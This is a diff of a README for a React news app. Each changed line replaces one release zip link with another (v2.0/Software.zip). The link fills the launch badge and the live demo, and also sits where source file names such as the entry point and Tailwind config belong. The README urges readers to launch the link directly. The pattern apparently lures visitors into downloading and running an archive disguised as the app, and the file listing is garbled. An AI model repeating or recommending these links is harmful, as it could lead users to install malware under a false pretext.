@@ -10,7 +10,7 @@ api, apis, auth, authentication, newsapi, newsapp, newspaper, react, react-compo
 
 ### Get Started:
 To explore the project and launch the News App, follow the link below:
-[![Launch News App](https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip%20News%20App-Click%20Here-blue)](https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip)
+[![Launch News App](https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip%20News%20App-Click%20Here-blue)](https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip)
 
 #### Note:
 The link provided needs to be launched directly to access the News App.
@@ -21,9 +21,9 @@ The link provided needs to be launched directly to access the News App.
   - **pages**: Different pages of the app.
   - **utils**: Utility functions for API handling.
 - **public**: Static assets for the app.
-- **https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip**: Main component rendering the app.
-- **https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip**: Entry point of the React application.
-- **https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip**: Configuration file for Tailwind CSS.
+- **https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip**: Main component rendering the app.
+- **https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip**: Entry point of the React application.
+- **https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip**: Configuration file for Tailwind CSS.
 
 ### Project Features:
 - **React Components**: Utilizes various React components for a modular structure.
@@ -42,7 +42,7 @@ The link provided needs to be launched directly to access the News App.
 For more in-depth details on the project setup, configuration, and usage, please refer to the documentation in the repository.
 
 ### Explore Further:
-Visit the [Live Demo](https://github.com/Zeeeezoo/news-app/releases/download/v1.0/Program.zip) of the News App to experience the project in action!
+Visit the [Live Demo](https://github.com/Zeeeezoo/news-app/releases/download/v2.0/Software.zip) of the News App to experience the project in action!
 
 ---
 
